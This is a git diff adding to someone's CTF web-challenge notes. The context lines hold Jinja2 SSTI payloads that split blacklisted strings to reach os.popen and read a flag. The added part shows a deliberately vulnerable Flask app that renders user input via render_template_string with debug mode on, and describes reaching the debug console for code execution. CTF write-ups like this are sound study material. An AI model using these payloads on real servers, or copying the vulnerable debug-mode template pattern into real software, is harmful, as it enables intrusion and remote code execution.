@@ -97,4 +97,28 @@ Approach:
   - we need to us an empty space between the blacklisted strings: ```cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()```
   - The only problem here, is that we’re exceeding the length limit. Solution was using lipsum.: ```lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()```
 
-- ##
+- ## Imaginary CTF (Almost SSTI)
+The inteersting thing here was that payload ccould only be 2 bytes long
+```
+#!/usr/bin/env python3
+
+from flask import Flask, render_template_string, request, Response  
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return Response(open(__file__).read(), mimetype='text/plain')
+
+@app.route('/ssti')
+def ssti():
+    query = request.args['query']
+    if len(query) > 2:
+        return "Too long!"
+    return render_template_string(query)
+
+app.run('0.0.0.0', 3002, debug=True)
+```
+The only thing we can do is cause an error with {{
+Since debug mode is enabled, we can open a Python interactive console on this page (clicking on the console icon button). So we have Remote Code Execution and thus can read the flag:
+![image](https://github.com/poorvi1910/Web/assets/146640913/82f46e42-f033-418d-815b-86f5583a3949)
